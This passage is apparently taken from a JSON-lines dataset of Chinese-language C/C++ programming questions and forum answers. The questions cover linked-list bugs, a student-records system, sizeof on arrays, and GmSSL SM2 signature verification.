while(id!=0)\r\n\t\t   {\r\n\t\t        while(p!=NULL)\r\n\t\t\t   {\r\n\t\t\t        if(p-&gt;id!=id)\r\n\t\t    \t   {p=p-&gt;tec; continue;}\r\n\t\t    \t   else\r\n\t\t    \t    {\r\n\t     \t\t    printf(\"\\n请输入学生的分数(考试成绩 平时成绩):\");\r\n\t     \t\t\tscanf(\"%f\",&amp;p-&gt;e_score);\r\n\t\t        \tscanf(\"%f\",&amp;p-&gt;n_score);\r\n\t\t        \tif(p-&gt;e_score&lt;60)\r\n\t\t        \t{\r\n\t\t        \t    p-&gt;t_score=p-&gt;e_score;\r\n\t\t        \t}\r\n\t\t        \telse\r\n\t\t        \t{\r\n\t\t        \tp-&gt;t_score=0.5*p-&gt;n_score+0.5*p-&gt;e_score;\r\n\t\t        \t}\r\n\t\t\t\t\tprintf(\"\\n成功登记分数。\");\r\n\t\t    \t    break;\r\n\t\t    \t   }\r\n\t\t\t    }\r\n\r\n\t\t\t printf(\"\\n请输入学生的ID(不再登记请输入0):\");\r\n\t\t      scanf(\"%d\",&amp;id);\r\n\t    \t}\r\n\t\t}while(id!=0);\r\n\r\n\t}\r\n}\r\n\r\nint score_stu(struct stu* p)  // 计算学生学分\r\n{\r\n    int z=0;\r\n\tstruct cla *p1;\r\n\tstruct res *p2;\r\n\tp1=p-&gt;cla;\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t    if(p1-&gt;e_score&gt;=60)\r\n\t\tz+=p1-&gt;score;\r\n\t\telse\r\n\t\t{\r\n\t\t    p2=p1-&gt;res;\r\n\t\t\tif(p2!=NULL)\r\n\t\t\t{\r\n\t\t\t   while(p2!=NULL)\r\n\t\t\t   {\r\n\t\t\t        if(p2-&gt;score&gt;=60)\r\n\t\t\t     z=z+p1-&gt;score;\r\n\t\t\t      p2=p2-&gt;next;\r\n\t\t\t   }\r\n\t\t\t}\r\n\t\t}\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\t return z;\r\n\r\n}\r\n\r\nvoid select_s(struct stu * p)  //学生选课选修\r\n{\r\n    struct tec *p1;\r\n\tstruct cla cla1;\r\n\tstruct cla *cp;\r\n   \tp1=head_tec;\r\n\tsystem(\"cls\");\r\n\tprintf(\"\\n\\t\\t\\t------------------------------------------\");\r\n\tprintf(\"\\n\\t\\t\\t***************课程列表*******************\");\r\n\tprintf(\"\\n\\t\\t\\t------------------------------------------\");\r\n\tprintf(\"\\n\\t\\t\\t教师&gt;&gt;&gt;&gt;学分&gt;&gt;&gt;&gt;&gt;课程名称&gt;&gt;&gt;&gt;&gt;&gt;&gt;课程编号&gt;&gt;\");\r\n\tprintf(\"\\n\\t\\t\\t------------------------------------------\");\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t\tprintf(\"\\n\\t\\t\\t%s \\t%d\\t%-10s\\t%-10d\",p1-&gt;name,p1-&gt;score,p1-&gt;cla_name,p1-&gt;cla_id);\r\n\t\tp1=p1-&gt;next;\r\n\t}\r\n\tprintf(\"\\n\\t\\t\\t------------------------------------------\");\r\n\t printf(\"\\n请输入你要选的课程编号+课程名称(输入0返回学生主页):\");\r\n    scanf(\"%d%s\",&amp;cla1.id,cla1.name);\r\n\tif(cla1.name[0]!='0'&amp;&amp;cla1.id!=0)\r\n\t{\r\n\t    cla1.id=p-&gt;id;\r\n     \tcla1.e_score=0;\r\n\t    cla1.n_score=0;\r\n\t    cla1.t_score=0;\r\n\t     cla1.score=0;\r\n\t    cp=insert_cla1(cla1);\r\n\t    insert_cla2(cp);\r\n\t    printf(\"\\n选课成功!\");\r\n\t}\r\n    getchar();\r\n}\r\n\r\nint idc(char *id)  //id装换 char 到int\r\n{\r\n   int z=0;\r\n   int i=0;\r\n   int l,n=1;\r\n   l=strlen(id);\r\n   for(i=0;i&lt;l;i++)\r\n   {\r\n      n*=10;\r\n   }\r\n   i=0;\r\n   n/=10;\r\n   while(id[i]!='\\0')\r\n   {\r\n       z=z+((int)id[i]-48)*n;\r\n\t   i++;\r\n\t   n/=10;\r\n   }\r\n   return z;\r\n}", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["教务信息管理系统，一旦录入选课内容并退出系统再次运行就会出错，求大神帮忙debug，急！", ["教务信息管理系统，一旦录入选课内容并退出系统再次运行就会出错，求大神帮忙debug，急！", "\n\n", "#include \"stdio.h\"", "\n#include \"string.h\"", "\n#include \"stdlib.h\"", "\n#include \"ctype.h\"", "\n\n", "struct stu ", "\n{", "\n    int id;//账号", "\n    char name[100];//姓名", "\n    int clas;//班级", "\n    char sex[6];//性别", "\n    int age;//年龄", "\n    int dor;//宿舍号码", "\n    char key[12];//密码", "\n    char phone[12];//电话号码", "\n    int score;", "\n    struct stu * next;", "\n    struct cla * cla;", "\n}*p1,stu1;", "\n\n", "struct tec //教师结构体", "\n{", "\n    int id;", "\n    char name[100];", "\n    char sex[6];", "\n    char cla_name[100];", "\n    int cla_id;//课程编号", "\n    char phone[12];", "\n    char key[12];", "\n    int score;", "\n    char email[30];", "\n    struct cla * cla;", "\n    struct tec * next;", "\n}tec1;", "\n\n", "struct cla //学生课程结构体 课程编号、课程名称、考试成绩、平时成绩、综合成绩、学分、重修否", "\n{", "\n    int id;//学生id", "\n    char name[100];", "\n    char stu_name[100];", "\n    float e_score;", "\n    float n_score;", "\n    float t_score;", "\n    int score;//学分", "\n    struct cla *next;", "\n    struct res *res;", "\n    struct cla *follow;", "\n    struct cla *tec;", "\n}cla1;", "\n\n", "struct res //重修结构体 重修学期、重修成绩，并且要考虑多次重修", "\n{", "\n    int id;", "\n    char name[100];    //course name", "\n    int semester;", "\n    float score;", "\n    int times;", "\n    struct res * next;", "\n    struct res * follow;", "\n}res1;", "\n\n", "struct order  // 为了学生成绩排名", "\n{", "\n  struct cla *pointer;", "\n  struct order *next;", "\n};", "\n\n", "struct info //信息结构体", "\n{", "\n    int num;  // the amount of stu or cla or res", "\n    char key[11];", "\n}in1,in2,in3,in4;", "\n\n", "struct info2", "\n{", "\n    char name[500];", "\n    char note[500];", "\n    int i;", "\n    struct info2 *next;", "\n};", "\n\n", "FILE *fp3,*fp1,*fp2,*fp4;", "\n\n", "struct stu * head=NULL,*p1,*p2;", "\nstruct tec * head_tec=NULL;", "\nstruct cla * clap,*headc;", "\nstruct res * resp,*headr;", "\n\n", "//definition", "\nvoid apple_ID();//用户注册", "\nvoid file_open();//用来打开文件和构建链表", "\nvoid file_close();", "\nvoid insert_stu(struct stu stu1);//学生结构体插入", "\nvoid insert_tec(struct tec tec1);//教师结构体插入", "\nstruct cla * insert_cla1(struct cla cla1);//将课程插入学生", "\nvoid insert_cla2(struct cla ", "cp);//将课程插入教师", "\nvoid insert_res(struct res res1);//插入重修", "\nvoid input_stu();//学生录入", "\nvoid input_tec();//教师录入", "\nvoid input_cla();//课程录入", "\nvoid input_res();//重修录入", "\nvoid copy_tec(struct tec *p1,struct tec tec1);//用于复制 减少代码量", "\nvoid copy_stu(struct stu *p1,struct stu stu1);// 用于复制 减少代码量", "\nvoid del_stu();//删除学生信息", "\nvoid del_tec();//删除教师信息", "\nvoid del_res();//删除重修信息", "\nvoid pfree_res(struct cla *p,struct res res1);//解锁及释放重修内存", "\nvoid pfree_cla(struct stu *p_stu,struct tec *p_tec,struct cla cla1);//解锁及释放课程内存", "\nvoid modify_stu(struct stu *p);// 学生修改自己信息", "\nvoid modify_tec(struct tec *p);// 教师修改自己信息", "\nvoid modify_stu_adm();//管理员进入某一学生系统 修改学生信息 如密码", "\nvoid modify_tec_adm();//管理员进入某一教师系统 修改教师信息 如密码", "\nvoid skim_stu(struct stu *head);//按ID或名字查看学生信息", "\nvoid skim_tec(struct tec *head);//按id或名字查看教师", "\nvoid skim_stu_all();//查看所有学生学分及不及格课程", "\nvoid skim_tec_all();//查看所有教师", "\nvoid skim_stu_course();// 根据课程查看学生 管理员功能", "\nvoid skim_stu_class();// 根据班级查看学生 管理员功能", "\nvoid skim_list_stu(struct tec * p);//教师查看所有选自己课的学生", "\nstruct order * list(struct cla *head);// 学生分数排序 返回链表头   to make a list of stu", "\nvoid print_stu(struct stu", " p1);//输出学生", "\nvoid adm_ui_1();//学生界面", "\nvoid adm_ui_2();//教师界面", "\nvoid stu_ui(struct stu ", "p);//管理员界面1", "\nvoid tec_ui(struct tec *p);//管理员界面2", "\nvoid adm_key();//管理员密码修改", "\nvoid st_key_stu(struct stu *p);//学生密码修改", "\nvoid st_key_tec(struct tec *p);//教师密码修改", "\nvoid key_adm();//管理员密码验证 只要密码", "\nvoid key_stu();//学生ID与密码验证", "\nvoid key_tec();//教师ID与密码验证", "\nvoid stu_score(struct tec * p);//教师查看学生分数 按id", "\nvoid tec_score(struct tec *head);//give score to someone 教师给分", "\nint  score_stu(struct stu", " p);// 计算学生学分", "\nvoid select_s(struct stu * p);//学生选课选修", "\nint  idc(char * id);//id装换 char 到int", "\nvoid key(char *key);//以星号形式接受密码并放到地址key上", "\nstruct info2 *Rfile2(struct info2 *head_note);", "\nvoid Savenote(struct info2 *head_note);", "\nstruct info2 *First2(struct info2 *head_note);", "\nvoid watchall(struct info2 *head_note);", "\nstruct info2 *leavenote(struct info2 *head_note);", "\nstruct info2 *notesys(struct info2 *head_note);", "\n\n", "main()", "\n{", "\n    int z;", "\n    system(\"cls\");", "\n      file_open();", "\n    do", "\n    {", "\n        printf(\"\\n\\t\\t\\t+---------------------------+\\n\");", "\n        printf(\"\\t\\t\\t|  欢迎使用教务信息管理系统 |\\n\");", "\n        printf(\"\\t\\t\\t+---------------------------+\\n\");", "\n        printf(\"提示：为保证您的操作得到保存，请按正常顺序退出系统^_^\\n\");", "\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");", "\n        printf(\"\\t\\t\\t+            主菜单            |\\n\");", "\n        printf(\"\\t\\t\\t--------------------------------\\n\");", "\n        printf(\"\\t\\t\\t+    [1]----学生登录           |\\n\");", "\n        printf(\"\\t\\t\\t+    [2]----教师登录           |\\n\");", "\n        printf(\"\\t\\t\\t+    [3]----管理员登陆         |\\n\");", "\n        printf(\"\\t\\t\\t+    [4]----用户注册           |\\n\");", "\n        printf(\"\\t\\t\\t+    [0]----退出系统           |\\n\");", "\n        printf(\"\\t\\t\\t--------------------------------\\n\");", "\n        printf(\"请输入您的选择：\");", "\n        scanf(\"%d\", &z);", "\n        switch(z)", "\n        {", "\n        case 0 :    break;", "\n        case 1 :key_stu();break;", "\n        case 2 :key_tec();break;", "\n        case 3 :key_adm();break;", "\n        case 4 :apple_ID();break;", "\n        default:printf(\"\\n无效选项!\");", "\n        }", "\n    }", "\n    while(z!=0);", "\n    file_close();  // to free all the pointer and input data to file", "\n}", "\n\n", "void file_open()  //用来打开文件和构建链表 head 和 head_tec 是全局变量", "\n{", "\n    struct stu stu1;", "\n    struct cla cla1;", "\n    struct res res1;", "\n    struct cla *cp;", "\n    int a1=0,a2=0,a3=0,a4=0;", "\n    if((fp1=fopen(\"stu\",\"rb\"))==NULL||(fp2=fopen(\"cla\",\"rb\"))==NULL||(fp3=fopen(\"res\",\"rb\"))==NULL||(fp4=fopen(\"tec\",\"rb\"))==NULL) //can't open the file", "\n    {", "\n        if((fp1=fopen(\"stu\",\"wb\"))==NULL||(fp2=fopen(\"cla\",\"wb\"))==NULL||(fp3=fopen(\"res\",\"wb\"))==NULL||(fp4=fopen(\"tec\",\"wb\"))==NULL)", "\n        printf(\"\\nSomething Wrong!\"); exit(0);", "\n    }", "\n    else  // open file successfully", "\n    {", "\n        fread(&in1,sizeof(struct info),1,fp1);", "\n        fread(&in2,sizeof(struct info),1,fp2);", "\n        fread(&in3,sizeof(struct info),1,fp3);", "\n        fread(&in4,sizeof(struct info),1,fp4);", "\n        strcpy(in2.key,\"19931101\");", "\n        if(in1.num==0&&in2.num==0) strcpy(in1.key,\"123456\");", "\n        // create a linked list", "\n        // add stu struct", "\n        while(fread(&stu1,sizeof(struct stu),1,fp1))", "\n        {", "\n            insert_stu(stu1);", "\n        }", "\n        fclose(fp1);", "\n        while(fread(&tec1,sizeof(struct tec),1,fp4))", "\n        {", "\n            insert_tec(tec1);", "\n        }", "\n        fclose(fp4);", "\n        while(fread(&cla1,sizeof(struct cla),1,fp2))", "\n        {", "\n            cp=insert_cla1(cla1);", "\n            if(cp!=NULL) insert_cla2(cp);", "\n        }", "\n            fclose(fp2);", "\n        }", "\n        while(fread(&res1,sizeof(struct res),1,fp3))", "\n        {", "\n            insert_res(res1);", "\n        }", "\n        fclose(fp3);", "\n}", "\n\n", "void file_close()  //head和head_tec是全局变量", "\n{", "\n    struct stu *p1,*p11;", "\n    struct cla *p2,*p21;", "\n    struct res *p3,*p31;", "\n    struct tec *p4,*p41;", "\n    fp1=fopen(\"stu\",\"wb\");", "\n    fp2=fopen(\"cla\",\"wb\");", "\n    fp3=fopen(\"res\",\"wb\");", "\n    fp4=fopen(\"tec\",\"wb\");", "\n\n", "fwrite(&in1,sizeof(struct info),1,fp1);\nfwrite(&in2,sizeof(struct info),1,fp2);\nfwrite(&in3,sizeof(struct info),1,fp3);\nfwrite(&in4,sizeof(struct info),1,fp4);\n\np1=head;\nwhile(p1!=NULL)\n{\n    fwrite(&(*p1),sizeof(struct stu),1,fp1);\n    p11=p1;\n    p1=p1->next;\n    free(p11);\n}\n\np4=head_tec;\nwhile(p4!=NULL)\n{\n    fwrite(&(*p4),sizeof(struct tec),1,fp4);\n    p41=p4;\n    p4=p4->next;\n    free(p41);\n}\n\np2=headc;\nwhile(p2!=NULL)\n{\n    fwrite(&(*p2),sizeof(struct cla),1,fp2);\n    p21=p2;\n    p2=p2->follow;\n    free(p21);\n}\np3=headr;\nwhile(p3!=NULL)\n{\n    fwrite(&(*p3),sizeof(struct res),1,fp3);\n    p31=p3;\n    p3=p3->follow;\n    free(p31);\n}\nprintf(\"\\nSaved!\\n\");\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof()是根据字符串末尾的 “\\0”来判断数组的大小的&amp;#xff0c;你的 char b只能储存三个元素&amp;#xff0c;存满之后没有位置放 &amp;#34;\\0&amp;#34; &amp;#xff0c;sizeof就不能正确判断数组b的大小。数组越界是很危险的&lt;br /&gt;可以这样改&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-keyword\"&gt;using&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;namespace&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;std&lt;/span&gt;;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;/span&gt;)&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;char&lt;/span&gt; b[&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;];\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(b)&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;;&amp;#43;&amp;#43;i){\n        b[i]&amp;#61;&lt;span class=\"hljs-built_in\"&gt;char&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;97&lt;/span&gt;&amp;#43;i);\n        cout &amp;lt;&amp;lt; b[i];\n    }\n    cout &amp;lt;&amp;lt;endl;\n    cout &amp;lt;&amp;lt;&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(b)&amp;lt;&amp;lt;endl;\n    cout &amp;lt;&amp;lt; b;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于#char#的问题，如何解决？(语言-c++)", ["入门cpp，在写该代码时出现如下情况，为什么直接输出却得到以下结果，是什么问题，望解答，感谢", "\n", "#include <iostream>", "\n\n", "using", " ", "namespace", " ", "std", ";\n\n", "int", " ", "main", "(", ")", "{\n    ", "char", " b[", "3", "];\n    ", "for", " (", "int", " i=", "0", ";i<", "sizeof", "(b);++i){\n        b[i]=", "char", "(", "97", "+i);\n        cout << b[i];\n    }\n    cout <<endl;\n    cout <<", "sizeof", "(b)<<endl;\n    cout << b;\n}\n", "\n"]], "Tag": "程序设计"}
{"Answer": "void reverse(int sp,int ep,char*in)\r\n{\r\n    int i;\r\n    char temp;\r\n    for(i=sp;i&lt;ep;i++){\r\n        temp=in[i];\r\n        in[i]=in[--ep];\r\n        in[ep]=temp;\r\n    }\r\n}\r\nvoid swap(int sp,int ep,char *in)\r\n{\r\n\t\t\t\tint i,j;\r\n\t\t\t\tchar temp;\r\n\t\t\t\tfor(i=0;i&lt;sp;i++)\r\n\t\t\t\t{\r\n\t\t\t\t\t\t\ttemp=in[i];\r\n\t\t\t\t\t\t\tin[i]=in[i+sp];\r\n\t\t\t\t\t\t\tin[i+sp]=temp;\r\n\t\t\t\t}\r\n}", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个c语言雏形 写2个交换函数", ["题目太长了不说了 （只需要修改reverse函数和swap函数）", "\n如下 一个是reverse 一个是swap", "\nreverse要求把in[sp]一直到in[ep-1]的排列顺序调转", "\nswap要求把in[0]到in[sp-1]为止的整体排列与in[sp]到in[ep-1]为止的整体排列换位", "\n\n", "我自己写的输出结果不对", "\n\n", "要求结果", "\n<例1>", "\n输入", "\n3", "\n001", "\n12345", "\n0000", "\n\n", "输出", "\n3", "\n18", "\n1", "\n\n", "<例2>", "\n输入", "\n2", "\n012", "\n1234", "\n\n", "输出", "\n6", "\n12", "\n\n", " #include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\ntypedef int item;\ntypedef struct node *link;\n\n#define MAX_LEN 100\n#define MAX_RESULTS 1000\n\nstruct node\n{\n    char *p;\n    link next;\n};\nlink NEW(char *inp,link next)\n{\n    link x=malloc(sizeof(*x));\n    x->p=inp;\n    x->next=next;\n    return x;\n}\n\nvoid reverse(int sp,int ep,char*in)\n{\n    int i;\n    char temp;\n    for(i=0;i<ep-sp+1;i++){\n        temp=in[sp+i];\n        in[sp+i]=in[ep-(i+1)];\n        in[ep-(i+1)]=temp;\n    }\n    //reverse in[sp]...in[ep-1]\n}\n\nvoid swap(int sp,int ep,char *in)\n{\n    int i,j,k;\n    char temp[101];\n    char box1[101];\n    char box2[101];\n    for(i=0;i<sp;i++){\n        temp[i]=in[i];\n    }\n    for(j=0;j<ep-sp+1;j++){\n        box1[j]=in[sp+j];\n    }\n    for(k=0;k<sp;k++){\n        box2[k]=temp[k];\n    }\n    in=strcat(box1,box2);\n    //swap in[0]~in[sp-1] by in[sp]~in[ep-1]\n}\n\nint chk_isnew(char *in,link *p_head)\n{\n    link t=*p_head;\n    while(t!=NULL)\n    {\n        if(strcmp(t->p,in)==0) return 0;\n        else t=t->next;\n        //implement\n        //return 0 if t->p is equal to in\n        //next node otherwise\n    }\n    char *store=(char *)malloc(sizeof(char)*MAX_LEN);\n    memcpy(store,in,sizeof(char)*MAX_LEN);\n    *p_head=NEW(store,*p_head);\n    return(1);\n}\n\nint main(void)\n{\n    link head;\n    int num,cnt,i;\n    scanf(\"%d\",&num);\n\n    int *result=(int *)malloc(sizeof(int)*MAX_RESULTS);\n    char *dish;\n    char *tmp_dish;\n    for(cnt=0; cnt<num; cnt++)\n    {\n        result[cnt]=0;\n        head=NULL;\n        dish=(char *)malloc(sizeof(char)*MAX_LEN);\n        memset(dish,0x00,sizeof(char)*MAX_LEN);\n        tmp_dish=(char *)malloc(sizeof(char)*MAX_LEN);\n        scanf(\"%s\",dish);\n        memcpy(tmp_dish,dish,sizeof(char)*MAX_LEN);\n        int len=strlen(dish);\n        for(i=1; i<len; i++)\n        {\n            int rev,swp;\n            for(rev=0; rev<4; rev++)\n            {\n                switch(rev)\n                {\n                case 0:\n                    break;\n                case 1:\n                    reverse(0,i,tmp_dish);\n                    break;\n                case 2:\n                    reverse(i,len,tmp_dish);\n                    break;\n                case 3:\n                    reverse(0,i,tmp_dish);\n                    reverse(i,len,tmp_dish);\n                    break;\n                }\n                for(swp=0; swp<2; swp++)\n                {\n                    switch(swp)\n                    {\n                    case 0:\n                        break;\n                    case 1:\n                        swap(i,len,tmp_dish);\n                        break;\n                    }\n                    if(chk_isnew(tmp_dish,&head)) result[cnt]++;\n                }\n                memcpy(tmp_dish,dish,sizeof(char)*MAX_LEN);\n            }\n        }\n        link t=head;\n        while(t->next!=NULL)\n        {\n            t=t->next;\n        }\n        link r;\n        t=head;\n        while(t->next!=NULL)\n        {\n            r=t;\n            t=t->next;\n            free(r->p);\n            free(r);\n        }\n        free(dish);\n        free(tmp_dish);\n    }\n    for(cnt=0; cnt<num; cnt++)\n    {\n        printf(\"%d\\n\",result[cnt]);\n    }\n    return 0;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;参考GPT和自己的思路&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;从您提供的代码中&amp;#xff0c;无法准确判断您的问题所在。但是可以看出您进行了一些修改但验证不成功&amp;#xff0c;这可能是参数传递的问题。建议您仔细比对官方demo中每一个参数的传递方式和您的修改代码中的参数传递方式&amp;#xff0c;并检查传递的数据是否正确和数据类型是否匹配。同时&amp;#xff0c;也可以尝试使用调试工具逐步验证您的代码&amp;#xff0c;找出问题所在。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["基于gmssl的sm2加密算法函数使用", ["使用官方给的demo验证成功了，demo：", "\n", "int", " main(void)\n{\n    SM2_KEY sm2_key;\n    SM2_KEY pub_key;\n    unsigned ", "char", " dgst", "[", "32", "]", ";\n    unsigned ", "char", " ", "sig", "[SM2", "_MAX_SIGNATURE_SIZE", "]", ";\n    size_t siglen;\n    ", "int", " ret;\n\n    sm3", "_digest((", "unsigned", " ", "char", "*", ")", "\"hello world\"", ", strlen(", "\"hello world\"", "), dgst);\n    format", "_bytes(", "stdout", ", 0, 0, ", "\"to be signed digest\"", ", ", "dgst", ", ", "sizeof", "(", "dgst", ")", ");\n\n    sm2", "_key_generate(&", "sm2_key", ")", ";\n\n    sm2", "_sign(&", "sm2_key", ", ", "dgst", ", ", "sig", ", &", "siglen", ")", ";\n    format", "_bytes(", "stdout", ", 0, 0, ", "\"signature\"", ", ", "sig", ", ", "siglen", ")", ";\n\n    memcpy(&pub_key, &sm2_key, sizeof(SM2_POINT));\n\n    ", "if", " ((ret = sm2", "_verify(&", "pub_key", ", ", "dgst", ", ", "sig", ", ", "siglen", ")", ") != ", "1", ") {\n        fprintf(stderr, ", "\"verify failed\\n\"", ");\n    }\n    ", "else", " {\n        printf(", "\"verify success\\n\"", ");\n    }\n\n    return ", "0", ";\n\n", "\n", "自己改造的函数验签失败，是传参的问题吗？", "\n", "\n", "int", " ", "sm2_sign_pre", "(SM2_KEY sm2_key,\n    ", "unsigned", " ", "char", " *msg,\n    ", "unsigned", " ", "char", " *dgst,\n    ", "unsigned", " ", "char", " *sig,\n    ", "size_t", " siglen )", " ", "{\n    ", "int", " ret = ", "0", ";\n    ", "sm3_digest", "(msg, ", "strlen", "(msg), dgst);\n          ", "/* sm2_key_generate(&sm2_key);      生成私钥key和公钥*/", "\n\n    \n    ", "if", " ((ret = ", "sm2_sign", "(&sm2_key, dgst, sig, &siglen)) != ", "1", ") {\n        ", "fprintf", "(stderr, ", "\"signature failed\\n\"", ");\n    }\n    ", "else", " {\n        ", "printf", "(", "\"signature success\\n\"", ");\n    }\n    ", "return", " ret;\n}\n", "int", " ", "sm2_verify_pre", "( SM2_KEY pub_key,\n                     ", "unsigned", " ", "char", "* msg,\n                     ", "unsigned", " ", "char", " *dgst,\n                     ", "unsigned", " ", "char", " *sig, \n    ", "size_t", " siglen\n                    )", " ", "{\n    ", "int", " ret;\n\n    ", "sm3_digest", "(msg, ", "strlen", "(msg), dgst);\n\n    ", "if", " ((ret = ", "sm2_verify", "(&pub_key, dgst, sig, siglen)) != ", "1", ") {\n        ", "return", " ret;\n    }\n    ", "else", " {\n        ", "return", " ", "0", ";\n    }\n}\n\n\n", "void", " ", "main", "()", " ", "{\n\n    SM2_KEY sm2_key;\n    ", "memset", "(&sm2_key, ", "0x00", ", ", "sizeof", "(sm2_key));\n\n    ", "sm2_key_generate", "(&sm2_key);\n    ", "//printf(\"私钥=[%x],公钥x=[%x],y=[%x]\\n\", sm2_key.private_key,sm2_key.public_key.x,sm2_key.public_key.y);", "\n\n    ", "unsigned", " ", "char", " oridata[", "1024", "];\n    ", "unsigned", " ", "char", " dgst[", "32", "];\n    ", "unsigned", " ", "char", " sign[", "72", "];\n    ", "int", " sign_len=", "0", ";\n    ", "int", " ret = ", "0", ";\n\n    ", "memset", "(oridata,", "0x00", ",", "sizeof", "(oridata));\n    ", "memset", "(dgst, ", "0x00", ", ", "sizeof", "(dgst));\n    ", "memset", "(sign, ", "0x00", ", ", "sizeof", "(sign));\n\n    ", "strcpy", "(oridata, ", "\"qwertyuiopasdgfhjkl\"", ");\n\n    ", "sm2_sign_pre", "(sm2_key, &oridata, &dgst, &sign, sign_len);\n\n\n    ret = ", "sm2_verify_pre", "(sm2_key, &oridata, &dgst, &sign, sign_len);\n    ", "printf", "(", "\"ret = [%d]\\n\"", ", ret);\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;list linklista&amp;#61;(list)malloc(sizeof(list));&lt;br /&gt;错误&amp;#xff0c;sizeof(list)只是一个指针对象的占用空间&amp;#xff0c;4个字节而已&lt;br /&gt;改为&lt;br /&gt;list linklista&amp;#61;(list)malloc(sizeof(struct node));&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["哪里有问题？段错误显示", ["#include <stdio.h>", "#include <stdlib.h>", "\n", "typedef int elemtype;", "typedef struct node *list;", "struct node{", "    elemtype data;", "    list next;", "};", "list makelinklist(int g)", "{", "    list head=(list)malloc(sizeof(list)),p,tail;", "    head->next=NULL;", "    tail=head;", "    elemtype i=1,x;", "    scanf(\"%d\",&x);", "    while(i<=g)", "    {", "        p=(list)malloc(sizeof(list));", "        p->data=x;", "        tail->next=p;", "        tail=p;", "        tail->next=NULL;", "        scanf(\"%d\",&x);", "        i++;", "   }", "    return head;", "}", "list deallinklist(list linklista,list linklistb)", "{", "    list head=(list)malloc(sizeof(list));", "    head=NULL;", "    list t,L;", "    for(linklista=linklista->next;linklista!=NULL;linklista=linklista->next)", "    {", "        for(linklistb=linklistb->next;linklistb!=NULL;linklistb=linklistb->next)", "        {", "            if(linklista->data==linklistb->data)", "            {", "                t=(list)malloc(sizeof(list));", "                t->data=linklista->data;", "                if(head==NULL)", "                    head=t;", "                else", "                    L->next=t;", "                L=t;", "                L->next=NULL;", "            }", "        }", "    }", "    return head;", "}", "void Print(list head)", "{", "    for(list t=head;t!=NULL;t=t->next)", "    {", "        if(t==head)", "        printf(\"%d\",t->data);", "        else", "        printf(\" %d\",t->data);", "    }", "}", "int main()", "{", "    list head;", "    list linklista=(list)malloc(sizeof(list));", "    list linklistb=(list)malloc(sizeof(list));", "    int m,n;", "    scanf(\"%d %d\",&m,&n);", "    linklista=makelinklist(m);", "    linklistb=makelinklist(n);", "    deallinklist(linklista,linklistb);", "    Print(head);", "    return 0;", "}", "\n"]], "Tag": "程序设计"}
{"Answer": "INPUT iput[1];是一个数组类型,存储相关内容一个地址值, iput第一个元素就是指向iput数组的首地址\r\n最后一句要的是一个地址,而不是内容\r\n\r\n\r\nINPUT iput 是定义的一个变量后,存储是变量的内容,而不是一个地址,最后一句的要的是地址,所以要加&amp;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问一个MFC结构体数组的问题", ["INPUT iput[1];", "\n    memset(iput, 0, 1 * sizeof(INPUT));", "\n    iput[0].type = INPUT_KEYBOARD;", "\n    iput[0].ki.wVk = VK_ESCAPE;", "\n    SendInput(1, iput, sizeof(INPUT));", "\n    如果第一句改成INPUT iput;的话 最后一句的第二个参数前面要加上取地址，请问这是为", "\n    什么呀？"]], "Tag": "程序设计"}
{"Answer": "add 函数中node是局部变量，函数结束后对应的变量空间就失效了，会在后续的执行中被篡改。要用malloc申请一个Node变量空间，才能真正add一个有效的Node.\r\nappend函数, cur在malloc赋值后直接赋值成list-&gt;next，内存泄漏了。而整个while以cur==NULL结束，没有真正找到append的点，应该以NULL==cur-&gt;next 结束。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["大佬能帮下忙吗？  单链表出现的读取访问权限冲突", ["# include <stdio.h>\n# include <stdlib.h>\n# include <stdbool.h>\n\ntypedef struct LNode {\n    int elem;\n    struct LNode* next;\n}Node, * List;\n\nList init() {\n    List list = (List)malloc(sizeof(Node));\n    list->elem = 0;   list->next = NULL;\n    return list;\n}\n\nint length(List list) {\n    return list->elem;\n}\n\nbool isEmpty(List list) {\n    return list->next == NULL;\n}\n\nvoid add(List list, int elem) {\n    Node node = { elem,NULL };\n    node.next = list->next;\n    list->next = &node;\n    list->elem++;\n}\n\nvoid append(List list, int elem) {\n    Node node = { elem,NULL };\n    List cur = (List)malloc(sizeof(Node));\n    cur = list->next;\n    while (cur != NULL) {\n        cur = cur->next;\n    }//结束while语句后，cur是一个nullptr\n    cur = &node;\n    list->elem++;\n}\n\n\nint* travel(List list) {\n    int* num = (int*)malloc(sizeof(int) * length(list));//初始化num数组\n    int i = 1;\n    if (isEmpty(list)) {\n        printf(\"链表为空！\");\n        num = NULL;\n    }\n    else {\n        List cur = 